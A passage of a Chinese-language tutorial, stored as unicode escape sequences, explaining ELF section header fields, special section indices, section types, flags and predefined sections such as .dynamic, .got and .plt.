\u7ed3\u5c3e\u7684\u5b57\u7b26\u4e32\u3002\n\n\n\n\n\n\nsh_type\n\n\n\u6839\u636e\u8282\u7684\u5185\u5bb9\u548c\u8bed\u4e49\u8fdb\u884c\u5206\u7c7b\uff0c\u5177\u4f53\u7684\u7c7b\u578b\u4e0b\u9762\u4f1a\u4ecb\u7ecd\u3002\n\n\n\n\n\n\nsh_flags\n\n\n\u6bcf\u4e00\u6bd4\u7279\u4ee3\u8868\u4e0d\u540c\u7684\u6807\u5fd7\uff0c\u63cf\u8ff0\u8282\u662f\u5426\u53ef\u5199\uff0c\u53ef\u6267\u884c\uff0c\u9700\u8981\u5206\u914d\u5185\u5b58\u7b49\u5c5e\u6027\u3002\n\n\n\n\n\n\nsh_addr\n\n\n\u5982\u679c\u8282\u533a\u5c06\u51fa\u73b0\u5728\u8fdb\u7a0b\u7684\u5185\u5b58\u6620\u50cf\u4e2d\uff0c\u6b64\u6210\u5458\u7ed9\u51fa\u8282\u533a\u7684\u7b2c\u4e00\u4e2a\u5b57\u8282\u5e94\u8be5\u5728\u8fdb\u7a0b\u955c\u50cf\u4e2d\u7684\u4f4d\u7f6e\u3002\u5426\u5219\uff0c\u6b64\u5b57\u6bb5\u4e3a 0\u3002\n\n\n\n\n\n\nsh_offset\n\n\n\u7ed9\u51fa\u8282\u533a\u7684\u7b2c\u4e00\u4e2a\u5b57\u8282\u4e0e\u6587\u4ef6\u5f00\u59cb\u5904\u4e4b\u95f4\u7684\u504f\u79fb\u3002SHT_NOBITS \u7c7b\u578b\u7684\u8282\u533a\u4e0d\u5360\u7528\u6587\u4ef6\u7684\u7a7a\u95f4\uff0c\u56e0\u6b64\u5176 sh_offset \u6210\u5458\u7ed9\u51fa\u7684\u662f\u6982\u5ff5\u6027\u7684\u504f\u79fb\u3002\n\n\n\n\n\n\nsh_size\n\n\n\u6b64\u6210\u5458\u7ed9\u51fa\u8282\u533a\u7684\u5b57\u8282\u5927\u5c0f\u3002\u9664\u975e\u8282\u533a\u7684\u7c7b\u578b\u662f SHT_NOBITS \uff0c\u5426\u5219\u8be5\u8282\u5360\u7528\u6587\u4ef6\u4e2d\u7684 sh_size  \u5b57\u8282\u3002\u7c7b\u578b\u4e3aSHT_NOBITS \u7684\u8282\u533a\u957f\u5ea6\u53ef\u80fd\u975e\u96f6\uff0c\u4e0d\u8fc7\u5374\u4e0d\u5360\u7528\u6587\u4ef6\u4e2d\u7684\u7a7a\u95f4\u3002\n\n\n\n\n\n\nsh_link\n\n\n\u6b64\u6210\u5458\u7ed9\u51fa\u8282\u533a\u5934\u90e8\u8868\u7d22\u5f15\u94fe\u63a5\uff0c\u5176\u5177\u4f53\u7684\u89e3\u91ca\u4f9d\u8d56\u4e8e\u8282\u533a\u7c7b\u578b\u3002\n\n\n\n\n\n\nsh_info\n\n\n\u6b64\u6210\u5458\u7ed9\u51fa\u9644\u52a0\u4fe1\u606f\uff0c\u5176\u89e3\u91ca\u4f9d\u8d56\u4e8e\u8282\u533a\u7c7b\u578b\u3002\n\n\n\n\n\n\nsh_addralign\n\n\n\u67d0\u4e9b\u8282\u533a\u7684\u5730\u5740\u9700\u8981\u5bf9\u9f50\u3002\u4f8b\u5982\uff0c\u5982\u679c\u4e00\u4e2a\u8282\u533a\u6709\u4e00\u4e2a doubleword \u7c7b\u578b\u7684\u53d8\u91cf\uff0c\u90a3\u4e48\u7cfb\u7edf\u5fc5\u987b\u4fdd\u8bc1\u6574\u4e2a\u8282\u533a\u6309\u53cc\u5b57\u5bf9\u9f50\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\nsh\\_addr \\% sh\\_addralign\nsh\\_addr \\% sh\\_addralign\n=0\u3002\u76ee\u524d\u5b83\u4ec5\u5141\u8bb8\u4e3a 0\uff0c\u4ee5\u53ca 2 \u7684\u6b63\u6574\u6570\u5e42\u6570\u3002 0 \u548c 1 \u8868\u793a\u6ca1\u6709\u5bf9\u9f50\u7ea6\u675f\u3002\n\n\n\n\n\n\nsh_entsize\n\n\n\u67d0\u4e9b\u8282\u533a\u4e2d\u5b58\u5728\u5177\u6709\u56fa\u5b9a\u5927\u5c0f\u7684\u8868\u9879\u7684\u8868\uff0c\u5982\u7b26\u53f7\u8868\u3002\u5bf9\u4e8e\u8fd9\u7c7b\u8282\u533a\uff0c\u8be5\u6210\u5458\u7ed9\u51fa\u6bcf\u4e2a\u8868\u9879\u7684\u5b57\u8282\u5927\u5c0f\u3002\u53cd\u4e4b\uff0c\u6b64\u6210\u5458\u53d6\u503c\u4e3a0\u3002\n\n\n\n\n\n\n\n\n\u6b63\u5982\u4e4b\u524d\u6240\u8bf4\uff0c\u7d22\u5f15\u4e3a\u96f6\uff08SHN_UNDEF\uff09\u7684\u8282\u533a\u5934\u4e5f\u5b58\u5728\uff0c\u6b64\u7d22\u5f15\u6807\u8bb0\u7684\u662f\u672a\u5b9a\u4e49\u7684\u8282\u533a\u5f15\u7528\u3002\u8fd9\u4e00\u9879\u7684\u4fe1\u606f\u5982\u4e0b\n\n\n\n\n\n\n\n\n\u5b57\u6bb5\u540d\u79f0\n\n\n\u53d6\u503c\n\n\n\u8bf4\u660e\n\n\n\n\n\n\n\n\n\n\nsh_name\n\n\n0\n\n\n\u65e0\u540d\u79f0\n\n\n\n\n\n\nsh_type\n\n\nSHT_NULL\n\n\n\u9650\u5236\n\n\n\n\n\n\nsh_flags\n\n\n0\n\n\n\u65e0\u6807\u5fd7\n\n\n\n\n\n\nsh_addr\n\n\n0\n\n\n\u65e0\u5730\u5740\n\n\n\n\n\n\nsh_offset\n\n\n0\n\n\n\u65e0\u6587\u4ef6\u504f\u79fb\n\n\n\n\n\n\nsh_size\n\n\n0\n\n\n\u65e0\u5927\u5c0f\n\n\n\n\n\n\nsh_link\n\n\nSHN_UNDEF\n\n\n\u65e0\u94fe\u63a5\u4fe1\u606f\n\n\n\n\n\n\nsh_info\n\n\n0\n\n\n\u65e0\u8f85\u52a9\u4fe1\u606f\n\n\n\n\n\n\nsh_addralign\n\n\n0\n\n\n\u65e0\u5bf9\u9f50\u8981\u6c42\n\n\n\n\n\n\nsh_entsize\n\n\n0\n\n\n\u65e0\u8868\u9879\n\n\n\n\n\n\n\n\n\u7279\u6b8a\u4e0b\u6807\n\n\n\u8282\u5934\u8868\u4e2d\u6bd4\u8f83\u7279\u6b8a\u7684\u51e0\u4e2a\u4e0b\u6807\u5982\u4e0b\n\n\n\n\n\n\n\n\n\u540d\u79f0\n\n\n\u503c\n\n\n\u542b\u4e49\n\n\n\n\n\n\n\n\n\n\nSHN_UNDEF\n\n\n0\n\n\n\u6807\u5fd7\u672a\u5b9a\u4e49\u7684\uff0c\u4e22\u5931\u7684\uff0c\u4e0d\u76f8\u5173\u7684\u6216\u8005\u5176\u5b83\u6ca1\u6709\u610f\u4e49\u7684\u8282\u5f15\u7528\u3002\u4f8b\u5982\uff0c\u4e0e\u8282\u53f7SHN_UNDEF\u76f8\u5173\u7684\u201c\u5b9a\u4e49\"\u7684\u7b26\u53f7\u5c31\u662f\u4e00\u4e2a\u672a\u5b9a\u4e49\u7b26\u53f7\u3002\n\u6ce8\uff1a\u867d\u71360\u53f7\u7d22\u5f15\u88ab\u4fdd\u7559\u7528\u4e8e\u672a\u5b9a\u4e49\u503c\uff0c\u8282\u5934\u8868\u4ecd\u7136\u5305\u542b\u7d22\u5f150\u7684\u9879\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u5982\u679cELF\u5934\u7684e_shnum\u4e3a6\uff0c\u90a3\u4e48\u7d22\u5f15\u5e94\u8be5\u4e3a0~5\u3002\u66f4\u52a0\u8be6\u7ec6\u7684\u5185\u5bb9\u5728\u540e\u9762\u4f1a\u8bf4\u660e\u3002\n\n\n\n\n\n\nSHN_LORESERVE\n\n\n0xff00\n\n\n\u4fdd\u7559\u7d22\u5f15\u503c\u8303\u56f4\u7684\u4e0b\u754c\u3002\n\n\n\n\n\n\nSHN_LOPROC\n\n\n0xff00\n\n\n\u5904\u7406\u5668\u76f8\u5173\u7684\u4e0b\u754c\n\n\n\n\n\n\nSHN_HIPROC\n\n\n0xff1f\n\n\n\u5904\u7406\u5668\u76f8\u5173\u7684\u4e0a\u754c\n\n\n\n\n\n\nSHN_ABS\n\n\n0xfff1\n\n\n\u76f8\u5173\u5f15\u7528\u7684\u7edd\u5bf9\u503c\u3002\u4f8b\u5982\u4e0e\u8282\u53f7SHN_ABS\u76f8\u5173\u7684\u7b26\u53f7\u62e5\u6709\u7edd\u5bf9\u503c\uff0c\u5b83\u4eec\u4e0d\u53d7\u91cd\u5b9a\u4f4d\u7684\u5f71\u54cd\n\n\n\n\n\n\nSHN_COMMON\n\n\n0xfff2\n\n\n\u8fd9\u4e00\u8282\u533a\u76f8\u5b9a\u4e49\u7684\u7b26\u53f7\u662f\u901a\u7528\u7b26\u53f7\uff0c\u4f8b\u5982FORTRAN COMMON\uff0cC\u8bed\u8a00\u4e2d\u672a\u5206\u914d\u7684\u5916\u90e8\u53d8\u91cf\u3002\n\n\n\n\n\n\nSHN_HIRESERVE\n\n\n0xffff\n\n\n\u4fdd\u7559\u7d22\u5f15\u503c\u8303\u56f4\u7684\u4e0a\u754c\u3002\n\n\n\n\n\n\n\n\n\u7cfb\u7edf\u4fdd\u7559\u5728\nSHN_LORESERVE\n\u5230\nSHN_HIRESERVE\n\u4e4b\u95f4(\u5305\u542b\u8fb9\u754c)\u7684\u7d22\u5f15\u503c\uff0c\u8fd9\u4e9b\u503c\u4e0d\u5728\u8282\u5934\u8868\u4e2d\u5f15\u7528\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u8282\u5934\u8868\u4e0d\u5305\u542b\u4fdd\u7559\u7d22\u5f15\u9879\u3002\u6ca1\u7279\u522b\u7406\u89e3\u3002\n\n\n\u90e8\u5206\u8282\u5934\u5b57\u6bb5\n\n\nsh_type\n\n\n\u8282\u7c7b\u578b\u76ee\u524d\u6709\u4e0b\u5217\u53ef\u9009\u8303\u56f4\uff0c\u5176\u4e2d SHT \u662f\nSection Header Table\n \u7684\u7b80\u5199\u3002\n\n\n\n\n\n\n\n\n\u540d\u79f0\n\n\n\u53d6\u503c\n\n\n\u8bf4\u660e\n\n\n\n\n\n\n\n\n\n\nSHT_NULL\n\n\n0\n\n\n\u8be5\u7c7b\u578b\u8282\u533a\u662f\u975e\u6d3b\u52a8\u7684\uff0c\u8fd9\u79cd\u7c7b\u578b\u7684\u8282\u5934\u4e2d\u7684\u5176\u5b83\u6210\u5458\u53d6\u503c\u65e0\u610f\u4e49\u3002\n\n\n\n\n\n\nSHT_PROGBITS\n\n\n1\n\n\n\u8be5\u7c7b\u578b\u8282\u533a\u5305\u542b\u7a0b\u5e8f\u5b9a\u4e49\u7684\u4fe1\u606f\uff0c\u5b83\u7684\u683c\u5f0f\u548c\u542b\u4e49\u90fd\u7531\u7a0b\u5e8f\u6765\u51b3\u5b9a\u3002\n\n\n\n\n\n\nSHT_SYMTAB\n\n\n2\n\n\n\u8be5\u7c7b\u578b\u8282\u533a\u5305\u542b\u4e00\u4e2a\u7b26\u53f7\u8868\uff08\nSYMbol TABle\n\uff09\u3002\u76ee\u524d\u76ee\u6807\u6587\u4ef6\u5bf9\u6bcf\u79cd\u7c7b\u578b\u7684\u8282\u533a\u90fd\u53ea  \u80fd\u5305\u542b\u4e00\u4e2a\uff0c\u4e0d\u8fc7\u8fd9\u4e2a\u9650\u5236\u5c06\u6765\u53ef\u80fd\u53d1\u751f\u53d8\u5316\u3002  \u4e00\u822c\uff0cSHT_SYMTAB \u8282\u533a\u63d0\u4f9b\u7528\u4e8e\u94fe\u63a5\u7f16\u8f91\uff08\u6307 ld  \u800c\u8a00\uff09 \u7684\u7b26\u53f7\uff0c\u5c3d\u7ba1\u4e5f\u53ef\u7528\u6765\u5b9e\u73b0\u52a8\u6001\u94fe\u63a5\u3002\n\n\n\n\n\n\nSHT_STRTAB\n\n\n3\n\n\n\u8be5\u7c7b\u578b\u8282\u533a\u5305\u542b\u5b57\u7b26\u4e32\u8868\uff08 \nSTRing TABle\n \uff09\u3002\n\n\n\n\n\n\nSHT_RELA\n\n\n4\n\n\n\u8be5\u7c7b\u578b\u8282\u533a\u5305\u542b\u663e\u5f0f\u6307\u5b9a\u4f4d\u6570\u7684\u91cd\u5b9a\u4f4d\u9879\uff08 \nRELocation entry with Addends\n \uff09\uff0c\u4f8b\u5982\uff0c32 \u4f4d\u76ee\u6807\u6587\u4ef6\u4e2d\u7684 Elf32_Rela \u7c7b\u578b\u3002\u6b64\u5916\uff0c\u76ee\u6807\u6587\u4ef6\u53ef\u80fd\u62e5\u6709\u591a\u4e2a\u91cd\u5b9a\u4f4d\u8282\u533a\u3002\n\n\n\n\n\n\nSHT_HASH\n\n\n5\n\n\n\u8be5\u7c7b\u578b\u8282\u533a\u5305\u542b\u7b26\u53f7\u54c8\u5e0c\u8868\uff08 \nHASH table\n \uff09\u3002\n\n\n\n\n\n\nSHT_DYNAMIC\n\n\n6\n\n\n\u8be5\u7c7b\u578b\u8282\u533a\u5305\u542b\u52a8\u6001\u94fe\u63a5\u7684\u4fe1\u606f\uff08 \nDYNAMIC linking\n \uff09\u3002\n\n\n\n\n\n\nSHT_NOTE\n\n\n7\n\n\n\u8be5\u7c7b\u578b\u8282\u533a\u5305\u542b\u4ee5\u67d0\u79cd\u65b9\u5f0f\u6807\u8bb0\u6587\u4ef6\u7684\u4fe1\u606f\uff08\nNOTE\n\uff09\u3002\n\n\n\n\n\n\nSHT_NOBITS\n\n\n8\n\n\n\u8be5\u7c7b\u578b\u8282\u533a\u4e0d\u5360\u7528\u6587\u4ef6\u7684\u7a7a\u95f4\uff0c\u5176\u5b83\u65b9\u9762\u548cSHT_PROGBITS\u76f8\u4f3c\u3002\u5c3d\u7ba1\u8be5\u7c7b\u578b\u8282\u533a\u4e0d\u5305\u542b\u4efb\u4f55\u5b57\u8282\uff0c\u5176\u5bf9\u5e94\u7684\u8282\u5934\u6210\u5458sh_offset \u4e2d\u8fd8\u662f\u4f1a\u5305\u542b\u6982\u5ff5\u6027\u7684\u6587\u4ef6\u504f\u79fb\u3002\n\n\n\n\n\n\nSHT_REL\n\n\n9\n\n\n\u8be5\u7c7b\u578b\u8282\u533a\u5305\u542b\u91cd\u5b9a\u4f4d\u8868\u9879\uff08\nRELocation entry without Addends\n\uff09\uff0c\u4e0d\u8fc7\u5e76\u6ca1\u6709\u6307\u5b9a\u4f4d\u6570\u3002\u4f8b\u5982\uff0c32\u4f4d\u76ee\u6807\u6587\u4ef6\u4e2d\u7684 Elf32_rel \u7c7b\u578b\u3002\u76ee\u6807\u6587\u4ef6\u4e2d\u53ef\u4ee5\u62e5\u6709\u591a\u4e2a\u91cd\u5b9a\u4f4d\u8282\u533a\u3002\n\n\n\n\n\n\nSHT_SHLIB\n\n\n10\n\n\n\u8be5\u7c7b\u578b\u6b64\u8282\u533a\u88ab\u4fdd\u7559\uff0c\u4e0d\u8fc7\u5176\u8bed\u4e49\u5c1a\u672a\u88ab\u5b9a\u4e49\u3002\n\n\n\n\n\n\nSHT_DYNSYM\n\n\n11\n\n\n\u4f5c\u4e3a\u4e00\u4e2a\u5b8c\u6574\u7684\u7b26\u53f7\u8868\uff0c\u5b83\u53ef\u80fd\u5305\u542b\u5f88\u591a\u5bf9\u52a8\u6001\u94fe\u63a5\u800c\u8a00\u4e0d\u5fc5  \u8981\u7684\u7b26\u53f7\u3002\u56e0\u6b64\uff0c\u76ee\u6807\u6587\u4ef6\u4e5f\u53ef\u4ee5\u5305\u542b\u4e00\u4e2a SHT_DYNSYM  \u8282\u533a\uff0c\u5176\u4e2d\u4fdd\u5b58\u52a8\u6001\u94fe\u63a5\u7b26\u53f7\u7684\u4e00\u4e2a\u6700\u5c0f\u96c6\u5408\uff0c\u4ee5\u8282\u7701\u7a7a\u95f4\u3002\n\n\n\n\n\n\nSHT_LOPROC\n\n\n0X70000000\n\n\n\u6b64\u503c\u6307\u5b9a\u4fdd\u7559\u7ed9\u5904\u7406\u5668\u4e13\u7528\u8bed\u4e49\u7684\u4e0b\u754c\uff08 \nLOw PROCessor-specific semantics\n \uff09\u3002\n\n\n\n\n\n\nSHT_HIPROC\n\n\nOX7FFFFFFF\n\n\n\u6b64\u503c\u6307\u5b9a\u4fdd\u7559\u7ed9\u5904\u7406\u5668\u4e13\u7528\u8bed\u4e49\u7684\u4e0a\u754c\uff08 \nHIgh PROCessor-specific semantics\n \uff09\u3002\n\n\n\n\n\n\nSHT_LOUSER\n\n\n0X80000000\n\n\n\u6b64\u503c\u6307\u5b9a\u4fdd\u7559\u7ed9\u5e94\u7528\u7a0b\u5e8f\u7684\u7d22\u5f15\u4e0b\u754c\u3002\n\n\n\n\n\n\nSHT_HIUSER\n\n\n0X8FFFFFFF\n\n\n\u6b64\u503c\u6307\u5b9a\u4fdd\u7559\u7ed9\u5e94\u7528\u7a0b\u5e8f\u7684\u7d22\u5f15\u4e0a\u754c\u3002\n\n\n\n\n\n\n\n\nsh_flags\n\n\n\u8282\u5934\u4e2d \nsh_flags\n  \u5b57\u6bb5\u7684\u6bcf\u4e00\u4e2a\u6bd4\u7279\u4f4d\u90fd\u53ef\u4ee5\u7ed9\u51fa\u5176\u76f8\u5e94\u7684\u6807\u8bb0\u4fe1\u606f\uff0c\u5176\u5b9a\u4e49\u4e86\u5bf9\u5e94\u7684\u8282\u533a\u7684\u5185\u5bb9\u662f\u5426\u53ef\u4ee5\u88ab\u4fee\u6539\u3001\u88ab\u6267\u884c\u7b49\u4fe1\u606f\u3002\u5982\u679c\u4e00\u4e2a\u6807\u5fd7\u4f4d\u88ab\u8bbe\u7f6e\uff0c\u5219\u8be5\u4f4d\u53d6\u503c\u4e3a1\uff0c\u672a\u5b9a\u4e49\u7684\u4f4d\u90fd\u4e3a0\u3002\u76ee\u524d\u5df2\u5b9a\u4e49\u503c\u5982\u4e0b\uff0c\u5176\u4ed6\u503c\u4fdd\u7559\u3002\n\n\n\n\n\n\n\n\n\u540d\u79f0\n\n\n\u503c\n\n\n\u8bf4\u660e\n\n\n\n\n\n\n\n\n\n\nSHF_WRITE\n\n\n0x1\n\n\n\u8fd9\u79cd\u8282\u5305\u542b\u4e86\u8fdb\u7a0b\u8fd0\u884c\u8fc7\u7a0b\u4e2d\u53ef\u4ee5\u88ab\u5199\u7684\u6570\u636e\u3002\n\n\n\n\n\n\nSHF_ALLOC\n\n\n0x2\n\n\n\u8fd9\u79cd\u8282\u5728\u8fdb\u7a0b\u8fd0\u884c\u65f6\u5360\u7528\u5185\u5b58\u3002\u5bf9\u4e8e\u4e0d\u5360\u7528\u76ee\u6807\u6587\u4ef6\u7684\u5185\u5b58\u955c\u50cf\u7a7a\u95f4\u7684\u67d0\u4e9b\u63a7\u5236\u8282\uff0c\u8be5\u5c5e\u6027\u5904\u4e8e\u5173\u95ed\u72b6\u6001(off)\u3002\n\n\n\n\n\n\nSHF_EXECINSTR\n\n\n0x4\n\n\n\u8fd9\u79cd\u8282\u5305\u542b\u53ef\u6267\u884c\u7684\u673a\u5668\u6307\u4ee4\uff08\nEXECutable INSTRuction\n\uff09\u3002\n\n\n\n\n\n\nSHF_MASKPROC\n\n\n0xf0000000\n\n\n\u6240\u6709\u5728\u8fd9\u4e2a\u63a9\u7801\u4e2d\u7684\u6bd4\u7279\u4f4d\u7528\u4e8e\u7279\u5b9a\u5904\u7406\u5668\u8bed\u4e49\u3002\n\n\n\n\n\n\n\n\nsh_link \n sh_info\n\n\n\u5f53\u8282\u533a\u7c7b\u578b\u7684\u4e0d\u540c\u7684\u65f6\u5019\uff0csh_link \u548c sh_info \u4e5f\u4f1a\u5177\u6709\u4e0d\u540c\u7684\u542b\u4e49\u3002\n\n\n\n\n\n\n\n\nsh_type\n\n\nsh_link\n\n\nsh_info\n\n\n\n\n\n\n\n\n\n\nSHT_DYNAMIC\n\n\n\u8282\u533a\u4e2d\u4f7f\u7528\u7684\u5b57\u7b26\u4e32\u8868\u7684\u8282\u5934\u7d22\u5f15\n\n\n0\n\n\n\n\n\n\nSHT_HASH\n\n\n\u6b64\u54c8\u5e0c\u8868\u6240\u4f7f\u7528\u7684\u7b26\u53f7\u8868\u7684\u8282\u5934\u7d22\u5f15\n\n\n0\n\n\n\n\n\n\nSHT_REL/SHT_RELA\n\n\n\u4e0e\u7b26\u53f7\u8868\u76f8\u5173\u7684\u7684\u8282\u5934\u7d22\u5f15\n\n\n\u91cd\u5b9a\u4f4d\u5e94\u7528\u5230\u7684\u8282\u7684\u8282\u5934\u7d22\u5f15\n\n\n\n\n\n\nSHT_SYMTAB/SHT_DYNSYM\n\n\n\u64cd\u4f5c\u7cfb\u7edf\u7279\u5b9a\u4fe1\u606f\uff0cLinux \u4e2d\u7684 ELF \u6587\u4ef6\u4e2d\u8be5\u9879\u6307\u5411\u7b26\u53f7\u8868\u4e2d\u7b26\u53f7\u6240\u5bf9\u5e94\u7684\u5b57\u7b26\u4e32\u8282\u533a\u5728 Section Header Table \u4e2d\u7684\u504f\u79fb\u3002\n\n\n\u64cd\u4f5c\u7cfb\u7edf\u7279\u5b9a\u4fe1\u606f\n\n\n\n\n\n\nother\n\n\nSHN_UNDEF\n\n\n0\n\n\n\n\n\n\n\n\nSections\n\n\n\u8282\u533a\u5305\u542b\u76ee\u6807\u6587\u4ef6\u4e2d\u9664\u4e86 ELF \u5934\u90e8\u3001\u7a0b\u5e8f\u5934\u90e8\u8868\u3001\u8282\u533a\u5934\u90e8\u8868\u7684\u6240\u6709\u4fe1\u606f\u3002\u8282\u533a\u6ee1\u8db3\u4ee5\u4e0b\u6761\u4ef6\n\n\n\n\n\u6bcf\u4e2a\u8282\u533a\u90fd\u6709\u5bf9\u5e94\u7684\u8282\u5934\u6765\u63cf\u8ff0\u5b83\u3002\u4f46\u662f\u53cd\u8fc7\u6765\uff0c\u8282\u533a\u5934\u90e8\u5e76\u4e0d\u4e00\u5b9a\u4f1a\u5bf9\u5e94\u7740\u4e00\u4e2a\u8282\u533a\u3002\n\n\n\u6bcf\u4e2a\u8282\u533a\u5728\u76ee\u6807\u6587\u4ef6\u4e2d\u662f\u8fde\u7eed\u7684\uff0c\u4f46\u662f\u5927\u5c0f\u53ef\u80fd\u4e3a 0\u3002\n\n\n\u4efb\u610f\u4e24\u4e2a\u8282\u533a\u4e0d\u80fd\u91cd\u53e0\uff0c\u5373\u4e00\u4e2a\u5b57\u8282\u4e0d\u80fd\u540c\u65f6\u5b58\u5728\u4e8e\u4e24\u4e2a\u8282\u533a\u4e2d\u3002\n\n\n\u76ee\u6807\u6587\u4ef6\u4e2d\u53ef\u80fd\u4f1a\u6709\u95f2\u7f6e\u7a7a\u95f4\uff08inactive space\uff09\uff0c\u5404\u79cd\u5934\u548c\u8282\u4e0d\u4e00\u5b9a\u4f1a\u8986\u76d6\u5230\u76ee\u6807\u6587\u4ef6\u4e2d\u7684\u6240\u6709\u5b57\u8282\uff0c\n\u95f2\u7f6e\u533a\u57df\u7684\u5185\u5bb9\u672a\u6307\u5b9a\n\u3002\n\n\n\n\n\u8bb8\u591a\u5728 ELF \u6587\u4ef6\u4e2d\u7684\u8282\u90fd\u662f\u9884\u5b9a\u4e49\u7684\uff0c\u5b83\u4eec\u5305\u542b\u7a0b\u5e8f\u548c\u63a7\u5236\u4fe1\u606f\u3002\u8fd9\u4e9b\u8282\u88ab\u64cd\u4f5c\u7cfb\u7edf\u4f7f\u7528\uff0c\u4f46\u662f\u5bf9\u4e8e\u4e0d\u540c\u7684\u64cd\u4f5c\u7cfb\u7edf\uff0c\u540c\u4e00\u8282\u533a\u53ef\u80fd\u4f1a\u6709\u4e0d\u540c\u7684\u7c7b\u578b\u4ee5\u53ca\u5c5e\u6027\u3002\n\n\n\u53ef\u6267\u884c\u6587\u4ef6\u662f\u7531\u94fe\u63a5\u5668\u5c06\u4e00\u4e9b\u5355\u72ec\u7684\u76ee\u6807\u6587\u4ef6\u4ee5\u53ca\u5e93\u6587\u4ef6\u94fe\u63a5\u8d77\u6765\u800c\u5f97\u5230\u7684\u3002\u5176\u4e2d\uff0c\u94fe\u63a5\u5668\u4f1a\u89e3\u6790\u5f15\u7528\uff08\u4e0d\u540c\u6587\u4ef6\u4e2d\u7684\u5b50\u4f8b\u7a0b\u7684\u5f15\u7528\u4ee5\u53ca\u6570\u636e\u7684\u5f15\u7528\uff0c\u8c03\u6574\u5bf9\u8c61\u6587\u4ef6\u4e2d\u7684\u7edd\u5bf9\u5f15\u7528\uff09\u5e76\u4e14\u91cd\u5b9a\u4f4d\u6307\u4ee4\u3002\u52a0\u8f7d\u4e0e\u94fe\u63a5\u8fc7\u7a0b\u9700\u8981\u76ee\u6807\u6587\u4ef6\u4e2d\u7684\u4fe1\u606f\uff0c\u5e76\u4e14\u4f1a\u5c06\u5904\u7406\u540e\u7684\u4fe1\u606f\u5b58\u50a8\u5728\u4e00\u4e9b\u7279\u5b9a\u7684\u8282\u533a\u4e2d\uff0c\u6bd4\u5982 \n.dynamic\n \u3002\n\n\n\u6bcf\u4e00\u79cd\u64cd\u4f5c\u7cfb\u7edf\u90fd\u4f1a\u652f\u6301\u4e00\u7ec4\u94fe\u63a5\u6a21\u578b\uff0c\u4f46\u8fd9\u4e9b\u6a21\u578b\u90fd\u5927\u81f4\u53ef\u4ee5\u5206\u4e3a\u4e24\u79cd\n\n\n\n\n\n\n\n\n\u7c7b\u578b\n\n\n\u63cf\u8ff0\n\n\n\n\n\n\n\n\n\n\n\u9759\u6001\u94fe\u63a5\n\n\n\u9759\u6001\u94fe\u63a5\u7684\u6587\u4ef6\u4e2d\u6240\u4f7f\u7528\u7684\u5e93\u6587\u4ef6\u6216\u8005\u7b2c\u4e09\u65b9\u5e93\u90fd\u88ab\u9759\u6001\u7ed1\u5b9a\u4e86\uff0c\u5176\u5f15\u7528\u5df2\u7ecf\u88ab\u89e3\u6790\u4e86\u3002\n\n\n\n\n\n\n\u52a8\u6001\u94fe\u63a5\n\n\n\u52a8\u6001\u94fe\u63a5\u7684\u6587\u4ef6\u4e2d\u6240\u4f7f\u7528\u7684\u5e93\u6587\u4ef6\u6216\u8005\u7b2c\u4e09\u65b9\u5e93\u53ea\u662f\u5355\u7eaf\u5730\u88ab\u94fe\u63a5\u5230\u53ef\u6267\u884c\u6587\u4ef6\u4e2d\u3002\u5f53\u53ef\u6267\u884c\u6587\u4ef6\u6267\u884c\u65f6\u4f7f\u7528\u5230\u76f8\u5e94\u51fd\u6570\u65f6\uff0c\u76f8\u5e94\u7684\u51fd\u6570\u5730\u5740\u624d\u4f1a\u88ab\u89e3\u6790\u3002\n\n\n\n\n\n\n\n\n\u6709\u4e00\u4e9b\u7279\u6b8a\u7684\u8282\u53ef\u4ee5\u652f\u6301\u8c03\u8bd5\uff0c\u6bd4\u5982\u8bf4 .debug \u4ee5\u53ca .line \u8282\uff1b\u652f\u6301\u7a0b\u5e8f\u63a7\u5236\u7684\u8282\u6709 .bss\uff0c.data\uff0c .data1\uff0c .rodata\uff0c .rodata1\u3002\n\n\n\n\n\n\n\n\n\u540d\u79f0\n\n\n\u7c7b\u578b\n\n\n\u5c5e\u6027\n\n\n\u542b\u4e49\n\n\n\n\n\n\n\n\n\n\n.comment\n\n\nSHT_PROGBITS\n\n\n\n\n\u5305\u542b\u7248\u672c\u63a7\u5236\u4fe1\u606f\u3002\n\n\n\n\n\n\n.debug\n\n\nSHT_PROGBITS\n\n\n\n\n\u6b64\u8282\u533a\u5305\u542b\u7528\u4e8e\u7b26\u53f7\u8c03\u8bd5\u7684\u4fe1\u606f\u3002\n\n\n\n\n\n\n.dynamic\n\n\nSHT_DYNAMIC\n\n\nSHF_ALLOC  SHF_WRITE\n\n\n\u6b64\u8282\u533a\u5305\u542b\u52a8\u6001\u94fe\u63a5\u4fe1\u606f\u3002SHF_WRITE \u4f4d\u8bbe\u7f6e\u4e0e\u5426\u662f\u5426\u88ab\u8bbe\u7f6e\u53d6\u51b3\u4e8e\u5177\u4f53\u7684\u5904\u7406\u5668\u3002\n\n\n\n\n\n\n.dynstr\n\n\nSHT_STRTAB\n\n\nSHF_ALLOC\n\n\n\u6b64\u8282\u533a\u5305\u542b\u7528\u4e8e\u52a8\u6001\u94fe\u63a5\u7684\u5b57\u7b26\u4e32\uff0c\u5927\u591a\u6570 \u60c5\u51b5\u4e0b\u8fd9\u4e9b\u5b57\u7b26\u4e32\u4ee3\u8868\u4e86\u4e0e\u7b26\u53f7\u8868\u9879\u76f8\u5173\u7684\u540d\u79f0\u3002\n\n\n\n\n\n\n.dynsym\n\n\nSHT_DYNSYM\n\n\nSHF_ALLOC\n\n\n\u6b64\u8282\u533a\u5305\u542b\u52a8\u6001\u94fe\u63a5\u7b26\u53f7\u8868\u3002\n\n\n\n\n\n\n.got\n\n\nSHT_PROGBITS\n\n\n\n\n\u6b64\u8282\u533a\u5305\u542b\u5168\u5c40\u504f\u79fb\u8868\u3002\n\n\n\n\n\n\n.line\n\n\nSHT_PROGBITS\n\n\n\n\n\u6b64\u8282\u533a\u5305\u542b\u7b26\u53f7\u8c03\u8bd5\u7684\u884c\u53f7\u4fe1\u606f\uff0c\u63cf\u8ff0\u4e86\u6e90\u7a0b\u5e8f\u4e0e\u673a\u5668\u6307\u4ee4\u4e4b\u95f4\u7684\u5bf9\u5e94\u5173\u7cfb\uff0c\u5176\u5185\u5bb9\u662f\u672a\u5b9a\u4e49\u7684\u3002\n\n\n\n\n\n\n.plt\n\n\nSHT_PROGBITS\n\n\n\n\n\u6b64\u8282\u533a\u5305\u542b\u8fc7\u7a0b\u94fe\u63a5\u8868\uff08procedure  linkage  